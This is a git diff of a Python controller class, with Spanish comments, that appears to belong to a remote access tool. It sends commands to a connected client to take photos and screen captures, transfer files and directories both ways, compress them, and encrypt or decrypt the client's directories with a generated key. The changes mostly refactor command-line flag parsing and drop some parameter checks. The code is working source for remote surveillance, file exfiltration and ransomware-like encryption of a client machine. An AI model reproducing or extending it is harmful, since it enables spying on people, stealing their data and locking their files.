@@ -217,7 +217,7 @@ class TCP:
     # cmd --> comando ejecutado
     # origen --> ubicacion del directorio que se quiere enviar
     # index --> indice desde el que se quiere iniciar
-    def enviarDirectorio(self, cmd, origen, index):
+    def enviarDirectorio(self, origen, index, auto=None):
         # Se calcula el numero de archivos
         archivos = []
         for i in os.listdir(origen):
@@ -242,7 +242,7 @@ class TCP:
             paquetes = int(peso/self.__chunk)
 
             if peso > 0:
-                if re.search("-a[= ]", cmd):
+                if auto:
                     print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
                     res = 'S'
                 else:
@@ -378,13 +378,9 @@ class TCP:
     def sendFileFrom(self, cmd):
         if re.search(r"\s-o[= ]", cmd):
             params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
-            if '-o' in params.keys():
-                destino = params['-o']
-                self.__conexion.send(cmd.encode())
-            else:
-                print(Fore.YELLOW + "[!] Error al detectar parametros")
-                return
+            destino = params['-o']
 
+            self.__conexion.send(cmd.encode())
             msg = self.__conexion.recv(1024).decode()
             if msg[:6] != "error:":
                 self.__conexion.send("ok".encode())
@@ -412,11 +408,7 @@ class TCP:
     def sendFileTo(self, cmd):
         if re.search(r"\s-o[= ]", cmd):
             params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
-            if '-i' in params.keys():
-                origen = params['-i']
-            else:
-                print(Fore.YELLOW + "[!] Error al detectar parametros")
-                return
+            origen = params['-i']
 
             if os.path.isfile(origen):
                 self.__conexion.send(cmd.encode())
@@ -429,11 +421,7 @@ class TCP:
 
         else:
             params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
-            if '-i' in params.keys():
-                origen = params['-i']
-            else:
-                print(Fore.YELLOW + "[!] Error al detectar parametros")
-                return
+            origen = params['-i']
 
             if os.path.isfile(origen):
                 self.__conexion.send(cmd.encode())
@@ -471,7 +459,7 @@ class TCP:
                 height, width = imagen.shape[:2]
                 escala = self.escalar(height, width)
             imagen = cv2.resize(imagen, None, fx=escala, fy=escala)
-            print(Fore.CYAN + f"[*] Escala:", escala)
+            print(Fore.CYAN + "[*] Escala:", escala)
 
             if flags:
                 if re.search("90", flags):
@@ -526,7 +514,7 @@ class TCP:
             escala = self.escalar(height, width)
             imagen = cv2.resize(original, None, fx=escala, fy=escala)
 
-            print(f"Escala: {escala}")
+            print(Fore.CYAN + "[*] Escala:", escala)
             cv2.imshow(f"{self.__userName}@{self.__addr[0]}: Foto", imagen)
             cv2.waitKey()
             cv2.destroyAllWindows()
@@ -574,11 +562,7 @@ class TCP:
     def sendDirFrom(self, cmd):
         if re.search(r"\s-o[= ]", cmd):
             params, flags = self.parametros(cmd, r"(\s-[iop]+[= ])", r"\s-a\s?")
-
-            if '-o' in params.keys():
-                destino = params['-o']
-            else:
-                destino = 'output'
+            destino = params['-o']
 
             if '-p' in params.keys():
                 try:
@@ -631,11 +615,20 @@ class TCP:
     # Funcion para enviar un directorio al cliente
     # cmd --> comando ingresado
     def sendDirTo(self, cmd):
-        if re.search("-d[= ]", cmd):
-            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
-            if re.search("-i[= ]", cmd):
-                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
-                if index <= 0:
+        if re.search(r"\s-o[= ]", cmd):
+            params, flags = self.parametros(cmd, r"(\s-[iop]+[= ])", r"\s-a\s?")
+
+            if '-i' in params.keys():
+                origen = params['-i']
+            else:
+                origen = 'input'
+
+            if '-p' in params.keys():
+                try:
+                    index = int(params['-p'])
+                    if index <= 0:
+                        index = 1
+                except:
                     index = 1
             else:
                 index = 1
@@ -644,18 +637,29 @@ class TCP:
                 self.__conexion.send(cmd.encode())
 
                 ok = self.__conexion.recv(8)
-                self.enviarDirectorio(cmd, origen, index)
+                if flags:
+                    self.enviarDirectorio(origen, index, 1)
+                else:
+                    self.enviarDirectorio(origen, index)
             else:
                 print(Fore.YELLOW + f"Directorio \"{origen}\" no encontrado")
 
         else:
-            if re.search("-i[= ]", cmd):
-                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
-                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
-                if index <= 0:
+            params, flags = self.parametros(cmd, r"(\s-[iop]+[= ])", r"\s-a\s?")
+
+            if '-i' in params.keys():
+                origen = params['-i']
+            else:
+                origen = 'input'
+
+            if '-p' in params.keys():
+                try:
+                    index = int(params['-p'])
+                    if index <= 0:
+                        index = 1
+                except:
                     index = 1
             else:
-                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                 index = 1
 
             if os.path.isdir(origen):
@@ -666,7 +670,10 @@ class TCP:
                 self.__conexion.send(destino.encode())
 
                 ok = self.__conexion.recv(8)
-                self.enviarDirectorio(cmd, origen, index)
+                if flags:
+                    self.enviarDirectorio(origen, index, 1)
+                else:
+                    self.enviarDirectorio(origen, index)
             else:
                 print(Fore.YELLOW + f"Directorio \"{origen}\" no encotrado")
 
@@ -695,8 +702,10 @@ class TCP:
     # Funcion para encriptar un directorio del cliente
     # cmd --> comando ingresado
     def encrypt(self, cmd):
-        clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -e", cmd)[0]
-        directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        params = self.parametros(cmd, r"(\s-[ek]+[= ])")[0]
+        clave = params['-k']
+        directorio = params['-e']
+
         if clave.endswith(".key"):
             self.generarClave(f"{clave}")
             key = self.cargarClave(f"{clave}")
@@ -940,7 +949,7 @@ class TCP:
                 # Si el comando es 'pic'...
                 elif cmd.lower()[:3] == "pic":
                     try:
-                        if re.search("-c[= ]", cmd):
+                        if re.search(r"\s-c[= ]", cmd):
                             # Se manda a llamar a la funcion
                             # 'self.pic'
                             self.pic(cmd)
@@ -955,7 +964,7 @@ class TCP:
                 # Si el comando es 'cap'...
                 elif cmd.lower()[:3] == "cap":
                     try:
-                        if re.search("-c[= ]", cmd):
+                        if re.search(r"\s-c[= ]", cmd):
                             # Se manda a llamar a la funcion
                             # 'self.cap'
                             self.captura(cmd)
@@ -985,7 +994,7 @@ class TCP:
                 # Si el comando es 'sdt'...
                 elif cmd.lower()[:3] == "sdt":
                     try:
-                        if re.search("-o[= ]", cmd):
+                        if re.search(r"\s-i[= ]", cmd):
                             # Se manda a llamar a la funcion
                             # 'self.sendDirTo'
                             self.sendDirTo(cmd)
@@ -999,12 +1008,12 @@ class TCP:
                 # Si el comando es 'zip'...
                 elif cmd.lower()[:3] == "zip":
                     try:
-                        if re.search("-o[= ]", cmd):
+                        if re.search(r"\s-i[= ]", cmd):
                             # Se manda a llamar a la funcion
                             # 'self.comprimir'
                             self.comprimir(cmd)
                         else:
-                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")
+                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-i)")
 
                     except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (zip)")
@@ -1013,13 +1022,13 @@ class TCP:
                 # Si el comando es 'unzip'...
                 elif cmd.lower()[:5] == "unzip":
                     try:
-                        if re.search("-o[= ]", cmd):
+                        if re.search(r"\s-i[= ]", cmd):
                             # Se manda a llamar a la funcion
                             # 'self.descomprimir'
                             self.descomprimir(cmd)
 
                         else:
-                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")
+                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-i)")
 
                     except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (unzip)")
@@ -1028,8 +1037,8 @@ class TCP:
                 # Si el comando es 'encrypt'...
                 elif cmd.lower()[:7] == "encrypt":
                     try:
-                        if re.search("-k[= ]", cmd):
-                            if re.search("-e[= ]", cmd):
+                        if re.search(r"\s-k[= ]", cmd):
+                            if re.search(r"\s-e[= ]", cmd):
                                 # Se manda a llamar a la funcion
                                 # 'self.encrypt'
                                 self.encrypt(cmd)
@@ -1046,9 +1055,10 @@ class TCP:
                 # Si el comando es 'decrypt'...
                 elif cmd.lower()[:7] == "decrypt":
                     try:
-                        if re.search("-d[= ]", cmd):
-                            if re.search("-k[= ]", cmd):
-                                clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
+                        if re.search(r"\s-d[= ]", cmd):
+                            if re.search(r"\s-k[= ]", cmd):
+                                params = self.parametros(cmd, r"(\s-[dk]+[= ])")[0]
+                                clave = params['-k']
                                 # Se manda a llamar a la funcion
                                 # 'self.decrypt'
                                 self.decrypt(cmd, clave)
@@ -1065,7 +1075,7 @@ class TCP:
                 # Si el comando es 'miwget'...
                 elif cmd.lower()[:6] == "miwget":
                     try:
-                        if re.search("-u[= ]", cmd):
+                        if re.search(r"\s-u[= ]", cmd):
                             # Se manda a llamar a la funcion
                             # 'self.wget'
                             self.wget(cmd)
